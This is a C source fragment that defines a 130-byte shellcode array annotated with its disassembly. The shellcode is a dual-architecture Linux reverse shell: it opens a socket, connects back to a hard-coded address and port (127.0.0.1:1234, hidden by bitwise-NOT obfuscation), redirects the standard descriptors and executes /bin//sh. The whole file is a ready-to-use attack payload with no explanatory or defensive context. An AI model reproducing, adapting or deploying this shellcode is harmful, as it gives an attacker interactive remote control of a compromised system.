
#define RS_SIZE 130

char RS[] = {
  /* 0000 */ "\xcc"                         /* int3                            */
  /* 0001 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
  /* 0006 */ "\xba\x80\xff\xff\xfe"         /* mov edx, 0xfeffff80             */
  /* 000B */ "\xf7\xd1"                     /* not ecx                         */
  /* 000D */ "\xf7\xd2"                     /* not edx                         */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x50"                         /* push rax                        */
  /* 0011 */ "\x89\x0c\x24"                 /* mov [rsp], ecx                  */
  /* 0014 */ "\x89\x54\x24\x04"             /* mov [rsp+0x4], edx              */
  /* 0018 */ "\x54"                         /* push rsp                        */
  /* 0019 */ "\x5d"                         /* pop rbp                         */
  /* 001A */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 001C */ "\x99"                         /* cdq                             */
  /* 001D */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 001F */ "\x6a\x01"                     /* push 0x1                        */
  /* 0021 */ "\x5e"                         /* pop rsi                         */
  /* 0022 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0024 */ "\x5f"                         /* pop rdi                         */
  /* 0025 */ "\x48\x75\x19"                 /* jnz 0x41                        */
  /* 0028 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 002A */ "\x0f\x05"                     /* syscall                         */
  /* 002C */ "\x97"                         /* xchg edi, eax                   */
  /* 002D */ "\x96"                         /* xchg esi, eax                   */
  /* 002E */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 0030 */ "\x0f\x05"                     /* syscall                         */
  /* 0032 */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
  /* 0035 */ "\x79\xf7"                     /* jns 0x2e                        */
  /* 0037 */ "\x55"                         /* push rbp                        */
  /* 0038 */ "\x5e"                         /* pop rsi                         */
  /* 0039 */ "\xb2\x10"                     /* mov dl, 0x10                    */
  /* 003B */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 003D */ "\x0f\x05"                     /* syscall                         */
  /* 003F */ "\xeb\x1f"                     /* jmp 0x60                        */
  /* 0041 */ "\x56"                         /* push rsi                        */
  /* 0042 */ "\x5b"                         /* pop rbx                         */
  /* 0043 */ "\x52"                         /* push rdx                        */
  /* 0044 */ "\x53"                         /* push rbx                        */
  /* 0045 */ "\x57"                         /* push rdi                        */
  /* 0046 */ "\x54"                         /* push rsp                        */
  /* 0047 */ "\x59"                         /* pop rcx                         */
  /* 0048 */ "\xcd\x80"                     /* int 0x80                        */
  /* 004A */ "\x93"                         /* xchg ebx, eax                   */
  /* 004B */ "\x59"                         /* pop rcx                         */
  /* 004C */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004E */ "\xcd\x80"                     /* int 0x80                        */
  /* 0050 */ "\x49\x79\xf9"                 /* jns 0x4c                        */
  /* 0053 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0055 */ "\x55"                         /* push rbp                        */
  /* 0056 */ "\x53"                         /* push rbx                        */
  /* 0057 */ "\x54"                         /* push rsp                        */
  /* 0058 */ "\x59"                         /* pop rcx                         */
  /* 0059 */ "\x6a\x03"                     /* push 0x3                        */
  /* 005B */ "\x5b"                         /* pop rbx                         */
  /* 005C */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005E */ "\xcd\x80"                     /* int 0x80                        */
  /* 0060 */ "\x99"                         /* cdq                             */
  /* 0061 */ "\x50"                         /* push rax                        */
  /* 0062 */ "\x50"                         /* push rax                        */
  /* 0063 */ "\x50"                         /* push rax                        */
  /* 0064 */ "\x54"                         /* push rsp                        */
  /* 0065 */ "\x5b"                         /* pop rbx                         */
  /* 0066 */ "\x53"                         /* push rbx                        */
  /* 0067 */ "\x5f"                         /* pop rdi                         */
  /* 0068 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 006E */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0075 */ "\x48\x78\x04"                 /* js 0x7c                         */
  /* 0078 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 007A */ "\x0f\x05"                     /* syscall                         */
  /* 007C */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 007E */ "\x04\x0c"                     /* add al, 0xc                     */
  /* 0080 */ "\xcd\x80"                     /* int 0x80                        */
};